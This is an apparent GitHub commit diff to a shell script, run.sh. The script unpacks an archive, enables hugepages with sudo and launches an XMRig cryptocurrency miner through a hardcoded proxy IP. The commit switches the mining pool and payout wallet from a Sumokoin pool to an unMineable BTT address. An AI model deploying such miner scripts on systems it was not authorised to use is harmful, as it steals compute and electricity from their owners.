bd41dd021c123e416f40304d4875e231d247c8b6
txjd734 <79805750+txjd734@users.noreply.github.com>
2021-03-06 18:10:03 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -3,4 +3,4 @@ tar xf *gz
 rm *gz
 cd mi*
 sudo sysctl -w vm.nr_hugepages=128
-./xmrigDaemon --donate-level 1 -a cn/r -o ca.sumo.herominers.com:10611 -u SumipBJ7rroF2VmkLaT2KwCL738782k8yMYFwYuU34br65KDBAj6Eg91SXuNxqfB4P3m2pY5Y1ay9YjWpoqszR37PhpeaiKHLqcU2UCZNsM91h -k --tls -p z --proxy=72.210.252.137:4145
+./xmrigDaemon --donate-level 1 -o rx.unmineable.com:3333 -a rx -k -u BTT:TCpaGB39jRY8KWbHfLv9fsSQgbNxZdF93i.z+50000 --proxy=72.210.252.137:4145
